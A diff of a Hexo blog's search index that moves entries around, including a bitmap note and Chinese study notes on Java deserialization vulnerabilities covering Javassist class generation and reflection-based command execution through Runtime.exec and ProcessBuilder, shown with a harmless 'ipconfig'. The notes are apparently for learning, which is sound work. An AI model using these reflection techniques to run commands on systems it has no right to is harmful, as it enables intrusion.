@@ -624,37 +624,6 @@ public List&lt;Integer&gt; postorderTraversal(TreeNode root) &#123;
       </tags>
   </entry>
   <entry>
-    <title>Bitmaps in Algorithms</title>
-    <url>/2023/03/14/Bitmaps-in-Algorithms/</url>
-    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Bitwise operations is one of the bitmap representation methods.</p>
-<p>Basically we have an integer <code>num</code>, we can use its <code>i-th</code> bit(counting from right to left, starting from 0) to represent the true/false value of <code>num[i]</code>.</p>
-<span id="more"></span>
-
-<ul>
-<li>Set the i-th bit to 1(true), and leave other bits unchanged: <code>num|=(1&lt;&lt;i)</code><ul>
-<li>left shift 1 by i bits, and perform OR operation with <code>num</code>.</li>
-</ul>
-</li>
-<li>Set the i-th bit to 0(false), and leave other bits unchanged: <code>num &amp;= ~(1&lt;&lt;i)</code> or <code>(num ^=1&lt;&lt;i)</code><ul>
-<li>take the complement(~) of 1 left shifted by i bits, and perform bitwise AND(&amp;) operation with <code>num</code>.</li>
-</ul>
-</li>
-<li>Get <code>num[i]</code>: <code>(num &gt;&gt; i) &amp; 1</code><ul>
-<li>extracts the i-th bit(counting from right to left)</li>
-</ul>
-</li>
-</ul>
-<h1 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h1><ul>
-<li>Bitmap indexing</li>
-<li>Bloom filters</li>
-<li>Leetcode 698</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>Bitmaps</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Bug Bounty Learning - Edit target website&#39;s aws file</title>
     <url>/2022/06/11/Bug-Bounty-Learning-Edit-target-website&#39;s-aws-file/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
@@ -696,6 +665,37 @@ public List&lt;Integer&gt; postorderTraversal(TreeNode root) &#123;
       </categories>
       <tags>
         <tag>Bug bounty learning</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bitmaps in Algorithms</title>
+    <url>/2023/03/14/Bitmaps-in-Algorithms/</url>
+    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Bitwise operations is one of the bitmap representation methods.</p>
+<p>Basically we have an integer <code>num</code>, we can use its <code>i-th</code> bit(counting from right to left, starting from 0) to represent the true/false value of <code>num[i]</code>.</p>
+<span id="more"></span>
+
+<ul>
+<li>Set the i-th bit to 1(true), and leave other bits unchanged: <code>num|=(1&lt;&lt;i)</code><ul>
+<li>left shift 1 by i bits, and perform OR operation with <code>num</code>.</li>
+</ul>
+</li>
+<li>Set the i-th bit to 0(false), and leave other bits unchanged: <code>num &amp;= ~(1&lt;&lt;i)</code> or <code>(num ^=1&lt;&lt;i)</code><ul>
+<li>take the complement(~) of 1 left shifted by i bits, and perform bitwise AND(&amp;) operation with <code>num</code>.</li>
+</ul>
+</li>
+<li>Get <code>num[i]</code>: <code>(num &gt;&gt; i) &amp; 1</code><ul>
+<li>extracts the i-th bit(counting from right to left)</li>
+</ul>
+</li>
+</ul>
+<h1 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h1><ul>
+<li>Bitmap indexing</li>
+<li>Bloom filters</li>
+<li>Leetcode 698</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>Bitmaps</tag>
       </tags>
   </entry>
   <entry>
@@ -2726,6 +2726,321 @@ System.out.println(helloService.hello());
       </tags>
   </entry>
   <entry>
+    <title>Java反序列化漏洞之Javassist(8)</title>
+    <url>/2021/11/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJavassist-8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>Javassist</strong>是一个可以<strong>动态</strong>生成Java字节码(.class)的库，它可以在<strong>运行</strong>的时候生成新的类。有时候，我们需要在所有class都被编译完后，运行时再修改或新建一个class文件，Javassist可以帮助我们达到这个目的。</p>
+<h1 id="Javassist基本元素"><a href="#Javassist基本元素" class="headerlink" title="Javassist基本元素"></a>Javassist基本元素</h1><p><strong>CtClass</strong> - Compile Time Class - 即编译时的Class，每个<strong>需要修改编辑</strong>的class都对应一个CtClass instance</p>
+<p><strong>ClassPool</strong> - 一个存储<strong>CtClass对象</strong>的容器</p>
+<p><strong>CtField</strong> - Java中的field</p>
+<p><strong>CtMethod</strong> - Java中的method</p>
+<span id="more"></span>
+
+<h1 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示"></a>简单演示</h1><h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><h3 id="方法一：pom-xml"><a href="#方法一：pom-xml" class="headerlink" title="方法一：pom.xml"></a>方法一：pom.xml</h3><pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;javassist&lt;/groupId&gt;
+    &lt;artifactId&gt;javassist&lt;/artifactId&gt;
+    &lt;version&gt;3.12.1.GA&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p><strong>方法二：导入jar包</strong></p>
+<p>可在网上下载jar包，导入module，library</p>
+<h2 id="创建Class"><a href="#创建Class" class="headerlink" title="创建Class"></a>创建Class</h2><pre><code class="java">import javassist.*;
+
+import java.io.IOException;
+
+public class javassistTest &#123;
+    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException &#123;
+        
+        /*创建Class*/
+        //需要创建的class对应一个CtClass, ClassPool是一个容器，包含了各种CtClass
+        ClassPool cp = ClassPool.getDefault();//获取一个默认的ClassPool
+        CtClass test = cp.makeClass(&quot;Evil&quot;);//用这个ClassPool来创建一个CtClass，名字为Evil
+
+        /*添加Field*/
+        CtField name = new CtField(cp.get(&quot;java.lang.String&quot;),&quot;name&quot;,test);//create a String-type field called name for the class test
+        name.setModifiers(Modifier.PRIVATE);//private attribute
+        test.addField(name,CtField.Initializer.constant(&quot;Mark&quot;));//给test class里的name字段初始化为Mark
+
+        /*添加constructor*/
+        CtConstructor ctConstructor = new CtConstructor(new CtClass[]&#123;&#125;,test);//给Test Class创建一个无参constructor
+        ctConstructor.setBody(&quot;&#123;name=\&quot;Jack\&quot;;&#125;&quot;);
+        test.addConstructor(ctConstructor);
+        //有参构造函数
+        CtConstructor ctConstructor1 = new CtConstructor(new CtClass[]&#123;cp.get(&quot;java.lang.String&quot;)&#125;,test);
+        ctConstructor1.setBody(&quot;&#123;$0.name=$1;&#125;&quot;);//this.name = name(第一个parameter)
+        test.addConstructor(ctConstructor1);
+
+        /*添加method*/
+        CtMethod printName = new CtMethod(CtClass.voidType,&quot;printName&quot;,new CtClass[]&#123;&#125;,test);
+        printName.setModifiers(Modifier.PUBLIC);
+        printName.setBody(&quot;&#123;System.out.println($0.name);&#125;&quot;);
+        printName.insertBefore(&quot;System.out.println(\&quot;before:\&quot;);&quot;);//在方法体前面加入（注意必须有了方法体才能插入）
+        printName.insertAfter(&quot;System.out.println(\&quot;after:\&quot;);&quot;);//在方法体后面加入
+        test.addMethod(printName);
+
+        /*写出Class到本地*/
+        test.writeFile();
+        test.detach();
+
+    &#125;
+&#125;
+</code></pre>
+<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJavassist-8/image-20211124203629163.png" alt="image-20211124203629163"></p>
+<h1 id="一些特殊参数"><a href="#一些特殊参数" class="headerlink" title="一些特殊参数"></a>一些特殊参数</h1><table>
+<thead>
+<tr>
+<th>标识符</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0、1、$2、 3 、 3、 3、…</td>
+<td>this和方法参数（1-N是方法参数的顺序，如第一个parameter）</td>
+</tr>
+<tr>
+<td>$args</td>
+<td>方法参数数组，类型为Object[]</td>
+</tr>
+<tr>
+<td>$$</td>
+<td>所有方法参数，例如：m($$)相当于m(1,1,2,…)</td>
+</tr>
+<tr>
+<td>$cflow(…)</td>
+<td>control flow 变量</td>
+</tr>
+<tr>
+<td>$r</td>
+<td>返回结果的类型，在强制转换表达式中使用。</td>
+</tr>
+<tr>
+<td>$w</td>
+<td>包装器类型，在强制转换表达式中使用。</td>
+</tr>
+<tr>
+<td>$_</td>
+<td>返回的结果值</td>
+</tr>
+<tr>
+<td>$sig</td>
+<td>类型为java.lang.Class的参数类型对象数组</td>
+</tr>
+<tr>
+<td>$type</td>
+<td>类型为java.lang.Class的返回值类型</td>
+</tr>
+<tr>
+<td>$class</td>
+<td>类型为java.lang.Class的正在修改的类</td>
+</tr>
+</tbody></table>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://juejin.cn/post/6952765170544279566#heading-13">Java字节码编程之非常好用的javassist</a></p>
+]]></content>
+      <categories>
+        <category>Web Security</category>
+        <category>JAVA反序列化漏洞</category>
+      </categories>
+      <tags>
+        <tag>Web Security</tag>
+        <tag>Java反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java反序列化漏洞之Java反射机制(1)</title>
+    <url>/2021/07/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6-1/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是正式开始学习Java反序列化漏洞的第一篇，而Java反射机制是熟知Java反序列化漏洞的第一步，此系列笔记是为了自己能更好理解反序列化漏洞，也希望通过学习，自己能深层了解漏洞成因、学会利用、自己编写、改编利用工具。</p>
+<h1 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h1><h2 id="什么是Java反射机制"><a href="#什么是Java反射机制" class="headerlink" title="什么是Java反射机制"></a>什么是Java反射机制</h2><blockquote>
+<p>Java的反射（reflection）机制是指在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。反射被视为动态语言的关键。</p>
+</blockquote>
+<p>通俗的来说，就是我们可以通过Java的反射机制来获取到任意一个Class、变量、method、instance等等，而我们<strong>动态</strong>地任意获取Class，正有利于我们实现反序列化漏洞的利用。</p>
+<h2 id="静态语言和动态特性"><a href="#静态语言和动态特性" class="headerlink" title="静态语言和动态特性"></a>静态语言和动态特性</h2><p>简单来说，动态语言可以改变一个变量的类型 - 你不用提前定义某个变量的类型，比如<code>Python</code>和<code>PHP</code>,这些语言会在运行时自动探针你的变量类型，而你也可以在代码中随时对这些变量类型进行改变。</p>
+<p>而静态语言例如<code>Java</code>,<code>C/C++</code>,<code>C#</code>就不一样，我们必须事先指定变量类型是<code>String</code>,<code>int</code>,还是<code>double</code>？</p>
+<p>而在<code>Java</code>中，有一个<strong>反射机制</strong>，它可以为我们提供一些动态特性 - 即使<code>Java</code>是一门静态语言。</p>
+<p>Java的反射机制可以让我们做到如下：</p>
+<ul>
+<li>在程序运行时，查找到一个<code>Object</code>所属的<code>Class</code></li>
+<li>在程序运行时，能找到任意一个Class的<code>variable</code>和<code>method</code></li>
+<li>在程序运行时，可以构造任意一个<code>Class</code>的<code>instance(Object)</code></li>
+<li>在程序运行时，可以调用任何一个<code>Object</code>的方法</li>
+</ul>
+<span id="more"></span>
+
+<h2 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h2><p>先来看一张图：</p>
+<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6-1/image-20211126201028486.png" alt="image-20211126201028486"></p>
+<p><strong>Class类</strong>： 保存类信息的类</p>
+<p>每一个新的class在创建的时候，都会new一个新的Class类。</p>
+<p>比如，我们在创建一个String类，这个String类在创建的同时，会有一个Class cls=new Class(String)被创建，专门用来保存这个String Class。</p>
+<p>再举个例子，比如我们在创建一个Person类，这个Person类在创建的时候，会有一个Class cls = new Class(Person)这样的instance被创建。<strong>但Class类和这两个类并非继承关系！！</strong></p>
+<p>所以，我们需要区分的是Class类是一个类，就像Person和String类一样，都是<strong>类</strong>，Person和String类在生成的时候，都会先生成Class类的instance（对象）。</p>
+<p>在Class类中，我们含有各种方法函数，其中Class类的构造方法是private，Class类还拥有<code>getMethod,invoke</code>这样的方法。</p>
+<p><strong>从图中可以看出：我们可以通过一个【person instance】.getClass()获取到person的Class类对象</strong></p>
+<p><strong>通过【person的Class类对象】.class获取到person instance.</strong></p>
+<h2 id="利用反射机制获取Class及Class静态初始化"><a href="#利用反射机制获取Class及Class静态初始化" class="headerlink" title="利用反射机制获取Class及Class静态初始化"></a>利用反射机制获取Class及Class静态初始化</h2><p>我们知道有三种方法可以获取到一个Class对象</p>
+<ul>
+<li><p><code>obj.getClass();</code></p>
+<ul>
+<li>当我们知道<strong>obj instance对象</strong>时可以使用这个方法</li>
+</ul>
+</li>
+<li><p><code>Class.forName(&quot;Class的名字&quot;);</code></p>
+</li>
+<li><p><code>Class.forName( String className , Boolean initialize , ClassLoader loader );</code></p>
+<ul>
+<li><p>此处<code>Class.forName(&quot;Class的名字&quot;);</code>等同于<code>Class.forName( &quot;Class的名字&quot; , true , currentLoader );</code></p>
+<blockquote>
+<ul>
+<li><code>String className</code> : 类名</li>
+<li><code>Boolean initialize</code> : 是否进行类初始化</li>
+<li><code>ClassLoader loader</code> : 加载器( 告诉 Java 虚拟机如何加载获取的类 , Java 默认根据类名( 即类的绝对路径 , 例如 <code>java.lang.Runtime()</code> )来加载类 )</li>
+</ul>
+</blockquote>
+</li>
+<li><p><code>Class</code>在<strong>初始化</strong>的时候，会自动执行<code>static&#123;&#125;</code>中的代码，如果我们能够控制一个<code>Class</code>，并向其中添加含有恶意代码的<strong>静态代码块</strong>，当<code>Class</code>被初始化的时候就会执行恶意代码。</p>
+</li>
+<li><p>当我们知道<strong>Class名字</strong>时可以使用这个方法</p>
+</li>
+</ul>
+</li>
+<li><p><code>className.class</code></p>
+<ul>
+<li>当我们已经<strong>加载过</strong>某个Class，可以用这个方法</li>
+</ul>
+</li>
+</ul>
+<p>其中，<code>Class.forName(&quot;Class的名字&quot;);</code>是最为常用的一种方式。</p>
+<pre><code class="java">Class&lt;?&gt; person = Class.forName(&quot;Person&quot;);
+
+System.out.println(person);
+</code></pre>
+<h2 id="利用反射机制获取method"><a href="#利用反射机制获取method" class="headerlink" title="利用反射机制获取method"></a>利用反射机制获取method</h2><p>我们在通过上面的代码获取到<code>class</code>后，可以获取到该<code>Class</code>的<code>method</code>。</p>
+<p>需要注意的是，我们依然有两种不同的方法来获取到<code>method</code>。</p>
+<pre><code class="java">//第一种方式：
+person.getDeclaredMethods();//获取所有Method，除了继承类的方法
+person.getDeclaredMethod(&quot;methodName&quot;,parameterTypes);//获取指定的method
+//第二种方式：
+person.getMethods();//获取类方法，但不包含private属性的方法
+person.getMethod(&quot;methodName&quot;,parameterTypes);//获取指定名字的方法
+</code></pre>
+<h2 id="构造instance"><a href="#构造instance" class="headerlink" title="构造instance"></a>构造instance</h2><p> 获取到了<code>Class</code>,我们又该如何获取到一个新的object呢？</p>
+<p>假设在Person Class中，我们有三个构造函数：</p>
+<pre><code class="java">public Person()&#123;//无参构造
+    System.out.println(&quot;NoArgConstructor&quot;);
+&#125;
+public Person(String name,String age)&#123;//两个参数构造
+    System.out.println(&quot;TwoArgsConstructor&quot;);
+&#125;
+public Person(String name,String age,boolean flag)&#123;
+    //三个参数构造
+    System.out.println(&quot;ThreeArgsConstructor&quot;);
+&#125;
+</code></pre>
+<p>当我们依次获取时</p>
+<pre><code class="java">person.newInstance();//在创建新的instance时，class的constructor会被执行，而此处默认执行无参数constructor
+       person.getConstructor(String.class,String.class).newInstance(&quot;leihehe&quot;,&quot;21&quot;);//此处执行两个参数的constructor
+       person.getConstructor(String.class,String.class,boolean.class).newInstance(&quot;leiheee&quot;,&quot;20&quot;,true);//此处执行三个参数的constructor
+</code></pre>
+<p>可得如下结果</p>
+<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721212917832.png" alt="image-20210721212917832"></p>
+<h2 id="invoke方法"><a href="#invoke方法" class="headerlink" title="invoke方法"></a>invoke方法</h2><p>当我们构造出来了一个新的<code>instance（Object）</code>且得到需要的<code>method</code>后，我们该如何<code>call</code>这个<code>Class</code>的方法呢？</p>
+<pre><code class="java">Object o = person.newInstance();//得到object
+person.getDeclaredMethod(&quot;setAge&quot;, String.class).invoke(o,&quot;11&quot;);//call setAge()方法
+</code></pre>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="java-lang-Runtime命令执行及访问private的方法"><a href="#java-lang-Runtime命令执行及访问private的方法" class="headerlink" title="java.lang.Runtime命令执行及访问private的方法"></a>java.lang.Runtime命令执行及访问private的方法</h2><p>我们在反序列化漏洞中会遇到的<code>java.lang.Runtime</code>是执行命令的最常见的方式。</p>
+<p>以下是java执行命令的语句</p>
+<pre><code class="java">Runtime.getRuntime().exec(&quot;ipconfig&quot;);
+</code></pre>
+<p>那如果我们要用<code>java</code>的反射机制来执行这段代码应该如何操作呢？</p>
+<p>于是我写下了这段代码：</p>
+<pre><code class="java">Class&lt;?&gt; runTimeClass = Class.forName(&quot;java.lang.Runtime&quot;);//先找到Runtime这个Class的Class类
+Method exec = runTimeClass.getDeclaredMethod(&quot;exec&quot;, String.class);//找到exec这个method
+Object o1 = runTimeClass.newInstance();//创建一个新的Runtime的实例
+exec.invoke(o1,&quot;ipconfig&quot;);//在实例中call exec()这个method
+</code></pre>
+<p>但是奇怪的事情发生了：</p>
+<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721214436241.png" alt="image-20210721214436241"></p>
+<p>代码提示19行出错 - 我们不能访问<code>private</code>属性的成员。难道是<code>constructor</code>有问题吗？</p>
+<p>我们尝试进入<code>Runtime Class</code>中看一下：</p>
+<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721214751377.png" alt="image-20210721214751377"> 果然，该构造方法是<code>private</code>的，加上前面所提到的，<code>className.newInstance()</code>是直接使用无参构造，所以我们不能直接创建这个<code>instance</code>。 </p>
+<p>如何解决呢？我们有两个方法</p>
+<ol>
+<li><p><strong>getRuntime()</strong></p>
+<p>其实之前我们就有写到执行语句是<code>Runtime.getRuntime().exec(&quot;ipconfig&quot;);</code>此处我们就没有new一个新的<code>instance</code>，反而是直接用<code>getter</code>来获取到<code>Runtime</code>。</p>
+<p>所以我们在此处可以这样写：</p>
+<pre><code class="java">Class&lt;?&gt; runTimeClass = Class.forName(&quot;java.lang.Runtime&quot;);//先找到Runtime这个Class
+Method exec = runTimeClass.getDeclaredMethod(&quot;exec&quot;, String.class);//找到exec这个method
+Method getRuntime = runTimeClass.getDeclaredMethod(&quot;getRuntime&quot;);//找到getRuntime()这个method
+Object o1=getRuntime.invoke(null);//call getRuntime()来获取到Runtime实例
+exec.invoke(o1,&quot;ipconfig&quot;);//执行方法
+</code></pre>
+</li>
+<li><p><strong>setAccessible() - 访问private方法</strong> </p>
+<p><code>Java</code>会对<code>private</code>的方法进行禁止访问的操作，而<code>setAccessible</code>可以让我们禁止或允许<code>Java</code>语言的访问检查，当我们设置<code>setAccessible(true)</code>时，我们便可以访问<code>private</code>方法。</p>
+<pre><code class="java">Class&lt;?&gt; runTimeClass = Class.forName(&quot;java.lang.Runtime&quot;);//先找到Runtime这个Class
+Method exec = runTimeClass.getDeclaredMethod(&quot;exec&quot;, String.class);//找到exec这个method
+Constructor&lt;?&gt; declaredConstructor = runTimeClass.getDeclaredConstructor();//不带参数的getConstructor是会获取到无参构造方法的，但因为Runtime的Constructor是private的，所以我们需要使用Declared
+declaredConstructor.setAccessible(true);//禁止java语言访问检查，让我们可以访问这个私有的constructor
+Object o1 = declaredConstructor.newInstance();//通过该constructor来创建新的instance
+exec.invoke(o1,&quot;ipconfig&quot;);//完成命令执行
+</code></pre>
+</li>
+</ol>
+<h2 id="java-lang-ProcessBuilder命令执行"><a href="#java-lang-ProcessBuilder命令执行" class="headerlink" title="java.lang.ProcessBuilder命令执行"></a>java.lang.ProcessBuilder命令执行</h2><p>知道我们是通过<code>exec()</code>执行代码后，我们接下来想要弄清楚，<code>exec()</code>是怎么工作的。在尝试跟随exec()方法后，我们最终来到了如下地方：</p>
+<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721221330679.png" alt="image-20210721221330679"></p>
+<p>可见我们创建了一个<code>ProcessBuilder</code>的<code>instance</code>，同时向其中传入了我们需要执行的命令<code>cmdArray</code>，<code>cmdArray</code>也是以<code>String[]</code>的类型传入的。</p>
+<p>进入<code>Processbuilder</code>可以看到它有两个<code>constructor</code>，一个是传入有参数的(<code>List&lt;String&gt;类型</code>)，一个是传入无参数的(<code>String[]类型</code>),注意,这里<code>String...</code>等价于<code>String[]</code></p>
+<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721222648669.png" alt="image-20210721222648669"></p>
+<p>再看<code>start()</code>方法</p>
+<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721221932382.png" alt="image-20210721221932382"></p>
+<p>传入的<code>command</code>又会被转化为<code>Array</code>，最后开始创建子程序执行等等（就不深入探究了）</p>
+<p>综上所述，我们只需要执行<code>new ProcessBuilder.start()</code>即可完成命令执行</p>
+<p>于是我们写出如下代码：</p>
+<pre><code class="java">        Class&lt;?&gt; processBuilderClass = Class.forName(&quot;java.lang.ProcessBuilder&quot;);//获取到ProcessBuilder这个class
+        Method start = processBuilderClass.getDeclaredMethod(&quot;start&quot;);//获取到start()这个方法
+        //因为两个constructor都是public的，所以我们可以只用用getConstructor而不用getDeclaredConstructor
+        Object oWithArg = processBuilderClass.getConstructor(List.class).newInstance(Arrays.asList(&quot;ipconfig&quot;,&quot;/all&quot;));//获取带参数的命令的instance
+        Object oNoArg = processBuilderClass.getConstructor(String[].class).newInstance((Object) new String[]&#123;&quot;ipconfig&quot;&#125;);//获取不带参数的命令的instance
+        Process argStart=(Process) start.invoke(oWithArg);
+        Process noArgStart=(Process) start.invoke(oNoArg);
+        InputStream argIn = argStart.getInputStream();//获取Process的输出流来作为输入字节流
+        InputStream noArgIn = noArgStart.getInputStream();//获取Process的输出流来作为输入字节流
+        InputStreamReader argReader=new InputStreamReader(argIn);//把字节流转化为字符流
+        InputStreamReader noArgReader=new InputStreamReader(noArgIn);//把字节流转化为字符流
+        BufferedReader argBr=new BufferedReader(argReader);//为字符流提供缓冲区，以便一次性读取整块数据
+        BufferedReader noArgBr=new BufferedReader(noArgReader);//为字符流提供缓冲区，以便一次性读取整块数据
+
+        String line=null;
+        while((line=argBr.readLine())!=null)&#123;//一行行读取
+            System.out.println(line);
+        &#125;
+
+        while((line=noArgBr.readLine())!=null)&#123;//一行行读取
+            System.out.println(line);
+        &#125;
+</code></pre>
+<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721232833104.png" alt="image-20210721232833104"></p>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><ul>
+<li><p>Java反射机制是Java这个静态语言中的动态特性，它让我们能够获取到、执行任意类的方法、变量，也能创建任意类的对象。</p>
+</li>
+<li><p><code>Class</code>被初始化时会自动执行<code>static&#123;&#125;</code>中的内容，此处可以被利用。</p>
+</li>
+<li><p><code>Declared</code>关键字让我们可以获取处继承类以外的所有方法。</p>
+</li>
+<li><p><code>setAccessible(true)</code>可以访问private方法，不被<code>java</code>语言进行访问检测。</p>
+</li>
+<li><p>我们可以通过Java反射机制利用Runtime和ProcessBuilder执行命令</p>
+</li>
+</ul>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.guildhab.top/2020/04/java-rmi-%e5%88%a9%e7%94%a82-java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e/">Epicccal - Java 反序列化漏洞(2) – Java 反射机制</a></p>
+]]></content>
+      <categories>
+        <category>Web Security</category>
+        <category>JAVA反序列化漏洞</category>
+      </categories>
+      <tags>
+        <tag>Web Security</tag>
+        <tag>Java反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java反序列化漏洞之JNDI注入详解(9)</title>
     <url>/2021/12/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3-9/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们在爆出的Java相关的漏洞复现中经常遇到JNDI注入，比如在最近的<strong>log4j2</strong>命令执行漏洞中就涉及到JNDI注入。</p>
@@ -3307,321 +3622,6 @@ public class TEST &#123;
 <h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.youtube.com/watch?v=Y8a5nB-vy78">A Journey From JNDI/LDAP Manipulation to Remote Code Execution Dream Land</a></p>
 <p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf">HPE Security Fortify, Software Security Research</a></p>
 <p><a href="https://blog.z3ratu1.cn/Java%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8.html">Java RMI反序列化与JNDI注入入门</a></p>
-]]></content>
-      <categories>
-        <category>Web Security</category>
-        <category>JAVA反序列化漏洞</category>
-      </categories>
-      <tags>
-        <tag>Web Security</tag>
-        <tag>Java反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java反序列化漏洞之Javassist(8)</title>
-    <url>/2021/11/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJavassist-8/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>Javassist</strong>是一个可以<strong>动态</strong>生成Java字节码(.class)的库，它可以在<strong>运行</strong>的时候生成新的类。有时候，我们需要在所有class都被编译完后，运行时再修改或新建一个class文件，Javassist可以帮助我们达到这个目的。</p>
-<h1 id="Javassist基本元素"><a href="#Javassist基本元素" class="headerlink" title="Javassist基本元素"></a>Javassist基本元素</h1><p><strong>CtClass</strong> - Compile Time Class - 即编译时的Class，每个<strong>需要修改编辑</strong>的class都对应一个CtClass instance</p>
-<p><strong>ClassPool</strong> - 一个存储<strong>CtClass对象</strong>的容器</p>
-<p><strong>CtField</strong> - Java中的field</p>
-<p><strong>CtMethod</strong> - Java中的method</p>
-<span id="more"></span>
-
-<h1 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示"></a>简单演示</h1><h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><h3 id="方法一：pom-xml"><a href="#方法一：pom-xml" class="headerlink" title="方法一：pom.xml"></a>方法一：pom.xml</h3><pre><code class="xml">&lt;dependency&gt;
-    &lt;groupId&gt;javassist&lt;/groupId&gt;
-    &lt;artifactId&gt;javassist&lt;/artifactId&gt;
-    &lt;version&gt;3.12.1.GA&lt;/version&gt;
-&lt;/dependency&gt;
-</code></pre>
-<p><strong>方法二：导入jar包</strong></p>
-<p>可在网上下载jar包，导入module，library</p>
-<h2 id="创建Class"><a href="#创建Class" class="headerlink" title="创建Class"></a>创建Class</h2><pre><code class="java">import javassist.*;
-
-import java.io.IOException;
-
-public class javassistTest &#123;
-    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException &#123;
-        
-        /*创建Class*/
-        //需要创建的class对应一个CtClass, ClassPool是一个容器，包含了各种CtClass
-        ClassPool cp = ClassPool.getDefault();//获取一个默认的ClassPool
-        CtClass test = cp.makeClass(&quot;Evil&quot;);//用这个ClassPool来创建一个CtClass，名字为Evil
-
-        /*添加Field*/
-        CtField name = new CtField(cp.get(&quot;java.lang.String&quot;),&quot;name&quot;,test);//create a String-type field called name for the class test
-        name.setModifiers(Modifier.PRIVATE);//private attribute
-        test.addField(name,CtField.Initializer.constant(&quot;Mark&quot;));//给test class里的name字段初始化为Mark
